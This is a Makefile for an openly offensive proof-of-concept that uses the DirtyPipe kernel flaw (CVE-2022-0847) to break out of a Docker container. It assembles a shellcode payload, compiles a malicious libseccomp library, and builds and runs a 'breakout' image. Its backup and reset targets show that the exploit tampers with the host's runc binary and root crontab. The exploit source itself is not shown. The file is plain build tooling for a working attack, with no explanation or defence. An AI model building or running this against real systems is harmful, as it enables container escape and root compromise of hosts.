#
# DirtyPipe container breakout
# https://github.com/jpts/CVE-2022-0847-DirtyPipe-Container-Breakout/
# Author: jpts
#

CC = gcc
CFLAGS = -Wall -Werror

.PHONY: all
all: help

.PHONY: help
help:
	@echo "make build|run|backup|reset"

.PHONY: payload
payload:
	nasm -f bin -o smoll runc_smoll.nasm

.PHONY: libseccomp
libseccomp:
	$(CC) $(CFLAGS) -fPIC -shared -rdynamic -o libseccomp.so ./dirtypipe.c ./bad_libseccomp_gen.c

.PHONY: build
build: payload libseccomp
	sudo docker build -t breakout .

.PHONY: run
run:
	sudo docker run --rm -it breakout

.PHONY: backup
backup:
	sudo cp /usr/sbin/runc /usr/sbin/runc.bak
	sudo cp /var/spool/cron/crontabs/root /root/crontab.bak

.PHONY: reset
reset:
	sudo systemctl stop docker
	sudo rm /usr/sbin/runc
	sudo cp /usr/sbin/runc.bak /usr/sbin/runc
	sudo systemctl start docker
	sudo cp /root/crontab.bak /var/spool/cron/crontabs/root
	sudo touch /var/spool/cron/crontabs

.PHONY: clean
clean:
	rm smoll libseccomp.so
